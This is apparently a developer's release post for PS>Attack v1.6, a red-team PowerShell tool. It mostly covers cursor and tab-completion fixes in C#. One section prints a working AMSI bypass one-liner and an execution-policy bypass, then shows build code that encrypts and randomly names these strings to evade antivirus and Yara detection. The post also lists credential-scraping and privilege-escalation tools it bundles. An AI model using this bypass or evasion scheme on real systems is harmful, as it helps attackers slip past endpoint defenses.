---
description: >-
  A lot has gone into PS>Attack since its debut at CarolinaCon earlier this
  year. There have been improvements to reliability, tab-completion and AV
  evasion.
---

# PS&gt;Attack v1.6

#### Stability Improvements <a id="stability-improvements"></a>

This biggest bug fix was related to cursor positioning. A good example of this is [this issue](https://github.com/jaredhaight/PSAttack/issues/10) where PS&gt;Attack would crash when you tried to move the cursor in a command that had wrapped the console.

Moving the cursor in a console app like PS&gt;Attack kind of operates on X/Y coordinates, where you manipulate `Console.CursorTop` and `Console.CursorLeft` to define where the cursor is. This presents a couple of issues in trying to create a prompt driven application. I need to keep track of where the prompt is so I know if the command that you're typing has wrapped and so I know where to send the letters you're typing. The original behavior for PS&gt;Attack was something like this:

* User presses Left
* Calculate where the cursor is within the command
* If there's room in the command to move left, `Console.CursorLeft -= 1`, else don't do anything.

The problem with this came up when the command wrapped, we'd see that we had room to move cause the command was long enough but when we'd trying to move the cursor left, eventually we'd try to subtract 1 from 0 and PS&gt;Attack would crash.

The fix for this is a function that ends up calculating the X/Y of the cursor in relation to the last prompt. With that information, we can make intelligent decisions as to where the cursor should go.

```text
public List<int> getCursorXY()
{
    // figure out if we've dropped down a line
    int cursorYDiff = this.cursorPos / Console.WindowWidth;
    int cursorY = this.promptPos + this.cursorPos / Console.WindowWidth;
    int cursorX = this.cursorPos - Console.WindowWidth * cursorYDiff;

    // if X is < 0, set cursor to end of line
    if (cursorX < 0) {
        cursorX = Console.WindowWidth - 1;
    }
    List<int> cursorXY = new List<int>();
    cursorXY.Add(cursorX);
    cursorXY.Add(cursorY);
    return cursorXY;

}
```

#### Tab Completion <a id="tab-completion"></a>

Tab completion has been almost entirely redone. This [fixed some issues](https://github.com/jaredhaight/PSAttack/issues/11) which is nice, but the big win is that autocomplete is much more reliable and works from where ever the cursor is located \(as opposed to whatever the last thing typed is\).

This is achieved by splitting up and identifying aspects of what's been typed in the command line when you hit tab, and then using the X/Y stuff from above to figure out what you're trying to auto-complete.

To do this, I created a simple object that represents a component of the command line. In PS&gt;Attack, there's sometimes a difference between what's being displayed and what's actually being run especially when it comes to tab completion. In this case, we only care about the displayCmd, or what the user sees on the command line.

```text
// This item is used to keep track of the various components on the command line
public class DisplayCmdComponent
{
    public int Index { get; set; }
    public string Contents { get; set; }
    public string Type { get; set; }
}
```

And when tab is hit, we split up everything in the command line and identify what it is with the `displayCmdComponents` function which returns a list of displayCmdComponent objects based on whats in the command line. \(I probably should have come up with a better name for the function\)

```text
// This function is used to identify chunks of autocomplete text to determine if it's a variable, path, cmdlet, etc
// May eventually have to move this to regex to make matches more betterer.
static String seedIdentification(string seed)
{
    string seedType = "cmd";
    if (seed.Contains(" -"))
    {
        seedType = "param";
    }
    else if (seed.Contains("$"))
    {
        seedType = "variable";
    }
    else if (seed.Contains("\\") || seed.Contains(":"))
    {
        seedType = "path";
    }
    // This causes an issue and I can't remember why I added this.. leaving it commented 
    // for now in case I need to come back to it (2016/08/21)
    //else if (seed.Length < 4 || seed.First() == ' ')
    //{
    //    seedType = "unknown";
    //}
    return seedType;
}

// This function splits text on the command line up and identifies each component
static List<DisplayCmdComponent> dislayCmdComponents(AttackState attackState)
{
    List<DisplayCmdComponent> results = new List<DisplayCmdComponent>();
    String[] displayCmdItemList = Regex.Split(attackState.displayCmd, @"(?=[\s])");
    int index = 0;
    int cmdLength = attackState.promptLength + 1;
    foreach (string item in displayCmdItemList)
    {
        string itemType = seedIdentification(item);
        DisplayCmdComponent itemSeed = new DisplayCmdComponent();
        itemSeed.Index = index;
        itemSeed.Contents = item;
        itemSeed.Type = itemType;
        cmdLength += item.Length;
        if ((cmdLength > attackState.cursorPos) && (attackState.cmdComponentsIndex == -1))
        {
            attackState.cmdComponentsIndex = index;
        }
        if (itemType == "path" || itemType == "unknown")
        {
            if (results.Last().Type == "path")
            {
                results.Last().Contents +=  itemSeed.Contents;

            }
            else
            {
                results.Add(itemSeed);
                index++;
            }
        }
        else
        {
            results.Add(itemSeed);
            index++;
        }
    }
    return results;
}
```

#### Antivirus and AMSI Evasion <a id="antivirus-and-amsi-evasion"></a>

Antivirus vendors have taken notice of PS&gt;Attack which is kind of cool. In some cases, it's even gotten it's own signature name \(thanks [Microsoft!](https://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=HackTool:Win32/PsAttack.A)\). PS&gt;Attack is absolutely the sort of thing that IT staff should be alerted about, it's probably not a good thing if it shows up on your network unexpectedly. Part of what I'm trying to achieve with PS&gt;Attack though is to help people emulate a realistic threat and that means evading Antivirus.

Through trial and error, I figured out that the signature Windows Defender was identifying was [Mattifestations AMSI Bypass](https://twitter.com/mattifestation/status/735261176745988096). AMSI is the Anti-Malware Scripting Interface that was introduced in Windows 10. It's a really cool technology designed to prevent malicious scripts from running on a computer and for awhile it caused issues with PS&gt;Attack, preventing some of the modules from loading. Adding Matt's AMSI bypass allows PS&gt;Attack to load all of its tools no matter what version of Windows you're on.

To resolve this issue, I resorted to the same trick I used on the PowerShell modules I'm using. "Sensitive" strings are now stored in a CSV which is encrypted during the build process and then stored inside PS&gt;Attack.

_If you want to get technical about, it's a pipe-separated file.. so a PSV?_

```text
// PSAttackBuildTool/Program.cs

// PLACE MATTS AMSI BYPASS IN KEYSTORE
generatedStrings.Store.Add("amsiBypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
generatedStrings.Store.Add("setExecutionPolicy", "Set-ExecutionPolicy Bypass -Scope Process -Force");

// WRITE KEYS TO CSV
DataContractJsonSerializer jsonSerializer = new DataContractJsonSerializer(typeof(Dictionary<string, string>));
string keyStoreFileName = PSABTUtils.RandomString(64, new Random());
generatedStrings.Store.Add("keyStoreFileName", keyStoreFileName);
using (StreamWriter keystoreCSV = new StreamWriter(Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv")))
{
    foreach (KeyValuePair<string, string> entry in generatedStrings.Store)
    {
        keystoreCSV.WriteLine("{0}|{1}", entry.Key, entry.Value);
    }
}
```

When PS&gt;Attack is started, this CSV is decrypted in memory and the values are converted to a dictionary object that's used throughout the program. The name of the CSV is a random string each time the build tool is run, which should make it more difficult for AV to detect.

```text
// PSAttack/Program.cs

// Get Encrypted Values
Assembly assembly = Assembly.GetExecutingAssembly();
Stream valueStream = assembly.GetManifestResourceStream("PSAttack.Resources." + Properties.Settings.Default.valueStore);
MemoryStream valueStore = CryptoUtils.DecryptFile(valueStream);
string valueStoreStr = Encoding.Unicode.GetString(valueStore.ToArray());

string[] valuePairs = valueStoreStr.Replace("\r","").Split('\n');

foreach (string value in valuePairs)
{
    if (value != "")
    {
        string[] entry = value.Split('|');
        attackState.decryptedStore.Add(entry[0], entry[1]);
    }
}
```

I also found out that Florian Roth had [written some Yara rules for PS&gt;Attack](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar#L3086) which is awesome and confirmed my thoughts that some of the embedded files in \(for example, key.txt which was the decrypting key used within the app\) could be used to identify PS&gt;Attack. For now, the key has moved to the properties file that sits alongside the executable. I'm not super happy with this approach and I'll be coming up with something else soon. It's good enough for now though.

#### Tool Additions <a id="tool-additions"></a>

There have been plenty of awesome PowerShell scripts released in the last couple of months and I've tried to add them to PS&gt;Attack when it made sense.

* FuzzySec released [Invoke-MS16-032](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1) which is a great and reliable privesc script.
* Back in January, Kevin Robertson released [Tater](https://github.com/Kevin-Robertson/Tater), another great privesc script that takes advantage of [Foxglove Security's Hot Potato attack](https://foxglovesecurity.com/2016/01/16/hot-potato/)
* PutterPanda released [Invoke-MimiKittenz](https://github.com/putterpanda/mimikittenz) which is an awesome credential scrape tool that dumps creds from processes
* I released [Invoke-MetasploitPayload](https://github.com/jaredhaight/Invoke-MetasploitPayload) which allows for easy execution of Metasploit payloads by leveraging its web\_delivery module.

#### Future <a id="future"></a>

Right now my major focus is further enhancing antivirus evasion \(McAfee is still catching PS&gt;Attack\). My plan is to further leverage the encrypted CSV \(PSV?\) by replacing static strings throughout PS&gt;Attack with random strings that are replaced at runtime \(when needed\). This should greatly improve evasion and be flexible for future improvements.

Second to that is getting command line execution working, this would allow PS&gt;Attack to work over reverse shells which would be super awesome.

I'm hoping to have both these things in place \(and maybe a couple other things\) before my talk at [Derby](https://www.derbycon.com). As always if you have any questions or comments, feel free to reach out on [twitter](https://twitter.com/jaredhaight).

